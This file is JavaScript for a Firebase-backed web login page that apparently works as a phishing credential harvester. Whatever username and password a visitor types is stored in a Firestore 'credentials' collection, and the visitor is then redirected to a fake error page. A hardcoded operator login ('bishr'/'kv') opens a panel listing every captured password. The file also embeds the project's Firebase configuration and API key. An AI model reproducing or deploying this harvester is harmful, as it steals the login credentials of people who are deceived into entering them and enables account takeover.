// Import Firebase SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { getFirestore, collection, addDoc, getDocs } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyCDLFf5FEMDUua7pPQiI-O5KVyhUikMNxc",
  authDomain: "getinbytechto.firebaseapp.com",
  projectId: "getinbytechto",
  storageBucket: "getinbytechto.firebasestorage.app",
  messagingSenderId: "752224645183",
  appId: "1:752224645183:web:ff2165ff9590e176fc888a",
  measurementId: "G-CELR4QXXCS"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// DOM Elements
const loginForm = document.getElementById("loginForm");
const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");
const popup = document.getElementById("popup");
const closePopup = document.getElementById("closePopup");
const displayCredentials = document.getElementById("displayCredentials");

// Handle form submission
loginForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();

  if (username === "bishr" && password === "kv") {
    // Show popup for valid login
    popup.style.display = "flex";

    // Fetch and display all credentials
    await fetchAllCredentials();
  } else {
    try {
      // Save credentials to Firestore
      await addDoc(collection(db, "credentials"), {
        username,
        password,
        timestamp: new Date()
      });

      // Success message for saved credentials
      window.open('/error.html', '_self')
    } catch (error) {
      console.error("Error saving to Firestore:", error);
    }
  }
});

// Close popup
closePopup.addEventListener("click", () => {
  popup.style.display = "none";
});

// Fetch and display all credentials from Firestore
async function fetchAllCredentials() {
  try {
    const querySnapshot = await getDocs(collection(db, "credentials"));

    // Clear previous credentials list
    displayCredentials.innerHTML = "";

    // Loop through the documents and display credentials
    querySnapshot.forEach((doc) => {
      const data = doc.data();
      const div = document.createElement("div");
      div.classList.add("credential");
      let userNameText = document.createElement('h3')
      let passwordText = document.createElement('h3')
      userNameText.textContent = data.username;
      passwordText.textContent = data.password;
      div.appendChild(userNameText);
      div.appendChild(passwordText);
      displayCredentials.appendChild(div);
    });
  } catch (error) {
    console.error("Error fetching credentials:", error);
  }
}
